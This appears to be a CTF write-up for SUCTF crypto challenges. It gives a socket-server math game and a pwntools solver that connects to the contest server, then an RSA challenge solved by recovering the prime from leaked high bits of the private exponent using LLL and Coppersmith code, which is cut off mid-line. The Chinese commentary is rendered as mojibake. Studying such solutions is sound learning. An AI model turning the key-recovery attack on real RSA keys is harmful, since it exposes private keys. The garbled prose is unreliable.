class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> signal<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> sage.geometry.hyperbolic_space.hyperbolic_isometry <span class="hljs-keyword">import</span> moebius_transform<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>banner = <span class="hljs-string">br&#x27;&#x27;&#x27;</span><br><span class="hljs-string"> _____ ______   ________  _________  ___  ___          ________  ________  _____ ______   _______      </span><br><span class="hljs-string">|\   _ \  _   \|\   __  \|\___   ___\\  \|\  \        |\   ____\|\   __  \|\   _ \  _   \|\  ___ \     </span><br><span class="hljs-string">\ \  \\\__\ \  \ \  \|\  \|___ \  \_\ \  \\\  \       \ \  \___|\ \  \|\  \ \  \\\__\ \  \ \   __/|    </span><br><span class="hljs-string"> \ \  \\|__| \  \ \   __  \   \ \  \ \ \   __  \       \ \  \  __\ \   __  \ \  \\|__| \  \ \  \_|/__  </span><br><span class="hljs-string">  \ \  \    \ \  \ \  \ \  \   \ \  \ \ \  \ \  \       \ \  \|\  \ \  \ \  \ \  \    \ \  \ \  \_|\ \ </span><br><span class="hljs-string">   \ \__\    \ \__\ \__\ \__\   \ \__\ \ \__\ \__\       \ \_______\ \__\ \__\ \__\    \ \__\ \_______\</span><br><span class="hljs-string">    \|__|     \|__|\|__|\|__|    \|__|  \|__|\|__|        \|_______|\|__|\|__|\|__|     \|__|\|_______|</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>welcome = <span class="hljs-string">b&quot;\nWelcome to my math game, let&#x27;s start now!\n&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_recvall</span>(<span class="hljs-params">self</span>):<br>        BUFF_SIZE = <span class="hljs-number">2048</span><br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            part = <span class="hljs-variable language_">self</span>.request.recv(BUFF_SIZE)<br>            data += part<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(part) &lt; BUFF_SIZE:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> data.strip()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg, newline=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> newline:<br>                msg += <span class="hljs-string">b&#x27;\n&#x27;</span><br>            <span class="hljs-variable language_">self</span>.request.sendall(msg)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self, prompt=<span class="hljs-string">b&#x27;SERVER &lt;INPUT&gt;: &#x27;</span></span>):<br>        <span class="hljs-variable language_">self</span>.send(prompt, newline=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._recvall()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">game1</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nLet&#x27;s play the game1!&quot;</span>)<br>        rounds = <span class="hljs-number">1000</span><br>        pseudo_prime = <span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.recv(prompt=<span class="hljs-string">b&#x27;[+] Plz Tell Me your number: &#x27;</span>))<br>        <span class="hljs-keyword">if</span> isPrime(pseudo_prime):<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nNo! it&#x27;s a prime, go away!&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.request.close()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds):<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">pow</span>(randint(<span class="hljs-number">2</span>, pseudo_prime), pseudo_prime - <span class="hljs-number">1</span>, pseudo_prime) != <span class="hljs-number">1</span>:<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nYou failed in round &quot;</span> + <span class="hljs-built_in">str</span>(i + <span class="hljs-number">1</span>).encode() + <span class="hljs-string">b&#x27;, bye~~&#x27;</span>)<br>                <span class="hljs-variable language_">self</span>.request.close()<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nCongratulations, you have won the game1!\n&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">game2</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;Let&#x27;s play the game2!&quot;</span>)<br>        res = <span class="hljs-variable language_">self</span>.recv(prompt=<span class="hljs-string">b&#x27;[+] Plz give Me your a, b, c: &#x27;</span>)<br>        a,b,c = [<span class="hljs-built_in">int</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> res.split(<span class="hljs-string">b&#x27;,&#x27;</span>)]<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">assert</span> (<span class="hljs-built_in">isinstance</span>(a, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(a, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(c, <span class="hljs-built_in">int</span>))<br>            <span class="hljs-keyword">assert</span> a &gt; <span class="hljs-number">0</span><br>            <span class="hljs-keyword">assert</span> b &gt; <span class="hljs-number">0</span><br>            <span class="hljs-keyword">assert</span> c &gt; <span class="hljs-number">0</span><br>            <span class="hljs-keyword">assert</span> a / (b + c) + b / (a + c) + c / (a + b) == <span class="hljs-number">4</span><br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">int</span>(a).bit_length() &gt; <span class="hljs-number">900</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(a).bit_length() &lt; <span class="hljs-number">1000</span><br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">int</span>(b).bit_length() &gt; <span class="hljs-number">900</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(b).bit_length() &lt; <span class="hljs-number">1000</span><br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">int</span>(c).bit_length() &gt; <span class="hljs-number">900</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(c).bit_length() &lt; <span class="hljs-number">1000</span><br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nCongratulations, you have won the game2!\n&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nNo! Game over!&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.request.close()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">final_game</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;Let&#x27;s play the game3!&quot;</span>)<br>        set_random_seed(<span class="hljs-built_in">int</span>(time.time()))<br>        C = ComplexField(<span class="hljs-number">999</span>)<br>        M = random_matrix(CC, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>)<br>        Trans = <span class="hljs-keyword">lambda</span> z: moebius_transform(M, z)<br>        out = []<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>            x = C.random_element()<br>            out.append((x,Trans(x)))<br>        out = <span class="hljs-built_in">str</span>(out).encode()<br>        <span class="hljs-variable language_">self</span>.send(out)<br>        kx = C.random_element()<br>        kx_str = <span class="hljs-built_in">str</span>(kx).encode()<br>        <span class="hljs-variable language_">self</span>.send(kx_str)<br>        C2 = ComplexField(<span class="hljs-number">50</span>)<br>        ans = C(<span class="hljs-variable language_">self</span>.recv(prompt=<span class="hljs-string">b&#x27;[+] Plz Tell Me your answer: &#x27;</span>).decode())<br>        <span class="hljs-keyword">if</span> C2(ans) == C2(Trans(kx)):<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nCongratulations, you have won the game3!&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.send(flag)<br>            <span class="hljs-variable language_">self</span>.request.close()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nNo! Game over!&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.request.close()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        signal.alarm(<span class="hljs-number">300</span>)<br>        <span class="hljs-variable language_">self</span>.send(banner)<br>        <span class="hljs-variable language_">self</span>.send(welcome)<br>        step1 = <span class="hljs-variable language_">self</span>.game1()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> step1:<br>            <span class="hljs-variable language_">self</span>.request.close()<br>        step2 = <span class="hljs-variable language_">self</span>.game2()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> step2:<br>            <span class="hljs-variable language_">self</span>.request.close()<br>        <span class="hljs-variable language_">self</span>.final_game()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST, PORT = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">10001</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;HOST:POST &quot;</span> + HOST+<span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-built_in">str</span>(PORT))<br>    server = ForkedServer((HOST, PORT), Task)<br>    server.allow_reuse_address = <span class="hljs-literal">True</span><br>    server.serve_forever()<br></code></pre></td></tr></table></figure><h3 id="è§£é¢˜-2"><a class="markdownIt-Anchor" href="#è§£é¢˜-2"></a> è§£é¢˜</h3><p>é¢˜ç›®è¢«åˆ†ä¸ºäº†ä¸‰ä¸ªæŒ‘æˆ˜</p><h4 id="game1"><a class="markdownIt-Anchor" href="#game1"></a> GAME1</h4><p>ä¼ªç´ æ•°ï¼Œéšä¾¿æ‰¾äº†ä¸ªwpæ‹¿äº†ä¸€ä¸ªæ•°</p><blockquote><p><a href="https://ctftime.org/writeup/21898">https://ctftime.org/writeup/21898</a><br />340649031679478708871356501710247209854526956821188127472136012686397651</p></blockquote><h4 id="game2"><a class="markdownIt-Anchor" href="#game2"></a> GAME2</h4><p>é€šè¿‡æœç´¢çŸ¥é“æ˜¯ä¸€ç§â€™é’“é±¼é¢˜â€™ï¼Œå¹¶ä¸”å·²ç»æœ‰äº†å¾ˆè¯¦ç»†åˆ†æ</p><p>è®ºæ–‡åœ°å€:<code>https://ami.uni-eszterhazy.hu/uploads/papers/finalpdf/AMI_43_from29to41.pdf</code></p><p>é¦–å…ˆçœ‹äº†è¿™ä¸ªè§†é¢‘è®²è§£ï¼Œæœ‰äº†å¤§è‡´çš„æ¦‚å¿µ<code>https://www.bilibili.com/video/BV1TA411175n</code></p><p>ç„¶åæ‰¾äº†ä¸ªè„šæœ¬<code>https://ctftime.org/writeup/9637</code>ï¼Œåœ¨æ ¹æ®è®ºæ–‡å’Œè¿™ç¯‡<code>https://zhuanlan.zhihu.com/p/33853851</code>çš„è®²è§£ï¼Œè°ƒæ•´å‚æ•°må¯ä»¥é€æ¸å¢é•¿æ•°å­—ç›´åˆ°è·å¾—æˆ‘ä»¬æƒ³è¦çš„æ•°æ®</p><h4 id="game3"><a class="markdownIt-Anchor" href="#game3"></a> GAME3</h4><p>é€šè¿‡æœç´¢çŸ¥é“æ˜¯ä¸€ç§MÃ¶biuså˜æ¢ï¼Œä¸æ‡‚ï¼Œä½†æœåˆ°è„šæœ¬ä¸€æŠŠæ¢­<code>https://github.com/Masrt200/sagetf/blob/master/Advanced%20Crypto.ipynb</code>(æœç´¢å¼•æ“æœç´¢MÃ¶biuså³å¯)ï¼Œç„¶åç”±äºç²¾åº¦é—®é¢˜ï¼Œæœ‰ç‚¹éš¾é€šè¿‡éªŒè¯ï¼ˆä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºè¿™ä¸ªï¼‰ï¼Œæ‰€ä»¥ç›´æ¥çˆ†ç ´äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r=remote(<span class="hljs-string">&quot;1.95.46.185&quot;</span>,<span class="hljs-number">10001</span>)<br><br>    <span class="hljs-comment">#https://ctftime.org/writeup/21898 éšä¾¿æ‹¿ä¸€ä¸ªæ•°</span><br>    r.recvuntil(<span class="hljs-string">b&#x27;[+] Plz Tell Me your number: &#x27;</span>)<br>    r.sendline(<span class="hljs-string">b&#x27;340649031679478708871356501710247209854526956821188127472136012686397651&#x27;</span>)<br><br>    <span class="hljs-comment">#https://zhuanlan.zhihu.com/p/33853851</span><br>    N=<span class="hljs-number">4</span><br>    e=(<span class="hljs-number">4</span>*(N^<span class="hljs-number">2</span>)) + ((<span class="hljs-number">12</span>*N)-<span class="hljs-number">3</span>)<br>    f=<span class="hljs-number">32</span>*(N+<span class="hljs-number">3</span>)<br>    eq=EllipticCurve([<span class="hljs-number">0</span>,e,<span class="hljs-number">0</span>,f,<span class="hljs-number">0</span>]) <span class="hljs-comment"># Define the elliptic curve corresponding to the equation a/(b+c)+b/(a+c)+c/(a+b)=N</span><br>    eq.rank()<br>    eq.gens()<br>    tmpP=eq(-<span class="hljs-number">100</span>,<span class="hljs-number">260</span>)<br>    m=<span class="hljs-number">9</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        P=m*tmpP<br>        x=P[<span class="hljs-number">0</span>]<br>        y=P[<span class="hljs-number">1</span>]<br>        a=(<span class="hljs-number">8</span>*(N+<span class="hljs-number">3</span>)-x+y)/(<span class="hljs-number">2</span>*(N+<span class="hljs-number">3</span>)*(<span class="hljs-number">4</span>-x))<br>        b=(<span class="hljs-number">8</span>*(N+<span class="hljs-number">3</span>)-x-y)/(<span class="hljs-number">2</span>*(N+<span class="hljs-number">3</span>)*(<span class="hljs-number">4</span>-x))<br>        c=(-<span class="hljs-number">4</span>*(N+<span class="hljs-number">3</span>)-(N+<span class="hljs-number">2</span>)*x)/((N+<span class="hljs-number">3</span>)*(<span class="hljs-number">4</span>-x))<br>        da=denominator(a)<br>        db=denominator(b)<br>        dc=denominator(c)<br>        l=lcm(da,lcm(db,dc))<br>        a,b,c=[<span class="hljs-built_in">int</span>(a*l),<span class="hljs-built_in">int</span>(b*l),<span class="hljs-built_in">int</span>(c*l)]<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">assert</span> a &gt; <span class="hljs-number">0</span><br>            <span class="hljs-keyword">assert</span> b &gt; <span class="hljs-number">0</span><br>            <span class="hljs-keyword">assert</span> c &gt; <span class="hljs-number">0</span><br>            <span class="hljs-keyword">assert</span> a / (b + c) + b / (a + c) + c / (a + b) == <span class="hljs-number">4</span><br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">int</span>(a).bit_length() &gt; <span class="hljs-number">900</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(a).bit_length() &lt; <span class="hljs-number">1000</span><br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">int</span>(b).bit_length() &gt; <span class="hljs-number">900</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(b).bit_length() &lt; <span class="hljs-number">1000</span><br>            <span class="hljs-keyword">assert</span> <span class="hljs-built_in">int</span>(c).bit_length() &gt; <span class="hljs-number">900</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(c).bit_length() &lt; <span class="hljs-number">1000</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        m=m+<span class="hljs-number">1</span><br><br>    r.recvuntil(<span class="hljs-string">b&#x27;[+] Plz give Me your a, b, c: &#x27;</span>)<br>    r.sendline((<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;a&#125;</span>,<span class="hljs-subst">&#123;b&#125;</span>,<span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>).encode())<br><br>    <span class="hljs-comment">#https://github.com/Masrt200/sagetf/blob/master/Advanced%20Crypto.ipynb</span><br>    r.recvuntil(<span class="hljs-string">b&quot;Let&#x27;s play the game3!&quot;</span>)<br>    r.recvline()<br>    C = ComplexField(<span class="hljs-number">999</span>)<br>    zw=r.recvline().strip().decode()<br>    zw=<span class="hljs-built_in">eval</span>(zw)<br>    z4=r.recvline().strip().decode()<br>    Z, W = [], []<br>    <span class="hljs-keyword">for</span> z,w <span class="hljs-keyword">in</span> zw:<br>        Z.append(C(z))<br>        W.append(C(w))<br>    z = C(z4)<br>    A = (W[<span class="hljs-number">0</span>] - W[<span class="hljs-number">1</span>]) * (z - Z[<span class="hljs-number">1</span>]) * (Z[<span class="hljs-number">0</span>] - Z[<span class="hljs-number">2</span>])<br>    B = (W[<span class="hljs-number">0</span>] - W[<span class="hljs-number">2</span>]) * (Z[<span class="hljs-number">0</span>] - Z[<span class="hljs-number">1</span>]) * (z - Z[<span class="hljs-number">2</span>])<br>    fz = (A * W[<span class="hljs-number">2</span>] - B * W[<span class="hljs-number">1</span>])/(A - B)<br>    r.sendline(<span class="hljs-built_in">str</span>(fz).encode())<br>    flag=r.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;suctf&#x27;</span> <span class="hljs-keyword">in</span> flag <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;SUCTF&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(flag)<br>        r.close()<br>        <span class="hljs-keyword">break</span><br>    r.close()<br><br><span class="hljs-comment">#b&#x27;[+] Plz Tell Me your answer: \nCongratulations, you have won the game3!\n\nSUCTF&#123;Hope_Y0u_have_a_NICE_tr1p_in_SUCTF~&#125;\n&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="å¤ç°"><a class="markdownIt-Anchor" href="#å¤ç°"></a> å¤ç°</h2><blockquote><p>ä»¥ä¸‹å¤ç°å‚è€ƒé¸¡å—å¸ˆå‚…çš„wp:<a href="https://tangcuxiaojikuai.xyz/post/67c5a822.html">https://tangcuxiaojikuai.xyz/post/67c5a822.html</a></p></blockquote><h3 id="su_rsa"><a class="markdownIt-Anchor" href="#su_rsa"></a> *SU_rsa</h3><h4 id="é¢˜ç›®-3"><a class="markdownIt-Anchor" href="#é¢˜ç›®-3"></a> é¢˜ç›®</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>).read()<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>e = getPrime(<span class="hljs-number">256</span>)<br>n = p*q<br>d = inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>d_m = ((d &gt;&gt; <span class="hljs-number">512</span>) &lt;&lt; <span class="hljs-number">512</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d_m = &quot;</span>,d_m)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n = &quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e = &quot;</span>,e)<br><br><span class="hljs-keyword">assert</span> flag[<span class="hljs-number">6</span>:-<span class="hljs-number">1</span>] == sha256(<span class="hljs-built_in">str</span>(p).encode()).hexdigest()[:<span class="hljs-number">32</span>]<br></code></pre></td></tr></table></figure><h4 id="è§£é¢˜-3"><a class="markdownIt-Anchor" href="#è§£é¢˜-3"></a> è§£é¢˜</h4><p>dé«˜ä½ï¼Œä¹‹å‰å¯†æŒ‘æœ‰ä¸€ä¸ªdé«˜ä½+ä½ä½çš„ï¼Œçœ‹æ¥è¿˜æ²¡ç ”ç©¶é€ã€‚</p><p>æˆ‘è‡ªå·±åªèƒ½åˆ°æ±‚å‡ºkäº†ï¼Œåé¢å°±ä¸çŸ¥é“æ€ä¹ˆæ ¼ï¼Œå¤ªéš¾äº†ã€‚ï¼ˆå“­</p><p>ä¸»è¦ç‚¹å°±æ˜¯æ ¼çš„é…å¹³ï¼Œç„¶åæ ¼å‡ºæ¥çš„ç»“æœç¬¬äºŒè¡Œæ‰æ˜¯ç›®æ ‡å‘é‡ï¼Œè€Œä¸”ä¹Ÿä¸æ˜¯é¢„æœŸçš„</p><p>ç„¶åå¾—åˆ°p%eçš„å€¼ï¼Œpä½ä½æ±‚è§£ï¼Œè¦ç”¨åˆ°å¤šçº¿ç¨‹çˆ†ç ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>d_m =  <span class="hljs-number">54846367460362174332079522877510670032871200032162046677317492493462931044216323394426650814743565762481796045534803612751698364585822047676578654787832771646295054609274740117061370718708622855577527177104905114099420613343527343145928755498638387667064228376160623881856439218281811203793522182599504560128</span><br>n =  <span class="hljs-number">102371500687797342407596664857291734254917985018214775746292433509077140372871717687125679767929573899320192533126974567980143105445007878861163511159294802350697707435107548927953839625147773016776671583898492755338444338394630801056367836711191009369960379855825277626760709076218114602209903833128735441623</span><br>e =  <span class="hljs-number">112238903025225752449505695131644979150784442753977451850362059850426421356123</span><br><br><br>k = e*d_m // n + <span class="hljs-number">1</span><br><span class="hljs-comment"># s=p+q</span><br><span class="hljs-comment"># ed_l+ks+[ed_h-1-k(n+1)]=0</span><br><span class="hljs-comment">#(d_l,s,1)*L=(d_l,s,1)</span><br><br>L = Matrix(ZZ, [<br>    [<span class="hljs-number">1</span>, <span class="hljs-number">0</span>,  e],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, k],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, e*d_m - <span class="hljs-number">1</span> - k*(n+<span class="hljs-number">1</span>)],<br>])<br><br><span class="hljs-comment"># é…å¹³ç›®æ ‡å‘é‡</span><br><span class="hljs-comment"># 513å°±è¡Œäº†(512ä¹Ÿä¸è¡Œ)ï¼Œè‡³äºä¸ºå•¥ï¼Œæˆ‘ä¸æ¸…æ¥š</span><br>L[:, -<span class="hljs-number">1</span>:] *= <span class="hljs-number">2</span>^<span class="hljs-number">513</span><br><br>L = L.LLL()<br><span class="hljs-comment"># L[0]:(-k,e,0)</span><br><span class="hljs-comment"># L[1]:(d_l-t*k,s+t*e,0)</span><br><span class="hljs-comment"># ç†è§£ï¼šeå’Œkåªæœ‰256bitï¼Œæ¯”æˆ‘ä»¬æƒ³è¦çš„d_l(512bit)å’Œs(512bit)éƒ½è¦çŸ­</span><br><span class="hljs-comment"># LLLä¹‹åè‚¯å®šæ˜¯å‰è€…è¿™ä¸ªè¾ƒçŸ­çš„å‘é‡,æ‰€ä»¥ä»ç¬¬äºŒå°çš„å‘é‡å…¥æ‰‹</span><br><br>res=L[<span class="hljs-number">1</span>] <span class="hljs-comment"># s+t*e</span><br>s=res[<span class="hljs-number">1</span>]%e<br>PR.&lt;x&gt; = PolynomialRing(Zmod(e))<br>f = x^<span class="hljs-number">2</span> + n - s*x   <span class="hljs-comment">#p*p+p*q-p*s</span><br>res = f.roots()<br>pl = <span class="hljs-built_in">int</span>(res[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]) <span class="hljs-comment"># p%e</span><br><br><span class="hljs-keyword">import</span> multiprocessing<br><span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">copper_attack</span>(<span class="hljs-params">i</span>):<br>    PR.&lt;x&gt; = PolynomialRing(Zmod(n))<br>    f = e*(<span class="hljs-number">2</span>^<span class="hljs-number">12</span>*x + i) + pl<br>    f = f.monic()<br>    res = f.small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">244</span>, beta=<span 